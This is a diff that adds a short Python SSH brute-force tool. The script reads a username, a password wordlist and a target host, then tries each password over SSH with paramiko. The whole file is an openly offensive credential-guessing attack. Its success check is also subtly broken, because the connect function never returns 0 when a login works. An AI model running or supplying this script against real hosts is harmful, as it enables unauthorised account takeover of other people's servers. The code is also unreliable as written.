@@ -1,0 +1,45 @@
+import paramiko
+import os
+import sys
+import socket
+from termcolor import colored
+
+# Collect data from user:
+user = input('[+] Enter the username: ')
+password_file = input('[+] Enter the passwords file: ')
+host = input('[+] Enter the target website in format www.example.com: ')
+
+# Function to connect to the SSH server:
+def ssh_connect(password, user, host):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        ssh.connect(host, port=22, username=user, password=password)
+    except paramiko.AuthenticationException:
+        return 1
+    except socket.error as e:
+        return 2
+    finally:
+        ssh.close()
+
+# Open the file with the passwords:
+if not os.path.exists(password_file):
+    print('[!!] File Not Found')
+    sys.exit(1)
+
+with open(password_file, 'r') as file:
+    for line in file.readlines():
+        password = line.strip()
+        try:
+            response = ssh_connect(password, user, host)
+            if response == 0:
+                print(colored(f'[+] Found password: {password}, for account: {user}', 'green'))
+                break
+            elif response == 1:
+                print(colored(f'[-] Incorrect login: {password}', 'red'))
+            elif response == 2:
+                print(colored('[!!] Can\'t connect', 'yellow'))
+                sys.exit(1)
+        except Exception as e:
+            print(e)
+            continue
